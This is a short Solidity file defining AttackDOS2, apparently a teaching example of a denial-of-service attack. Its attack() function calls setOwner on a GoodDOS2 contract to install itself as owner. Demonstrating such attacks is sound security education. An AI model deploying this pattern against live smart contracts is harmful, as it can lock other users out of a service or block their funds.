//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodDOS2.sol";

contract AttackDOS2 {
   GoodDOS2 public good;

   constructor(address _good) {
      good = GoodDOS2(_good);
   }

   function attack() public {
      good.setOwner(address(this));
   }
}
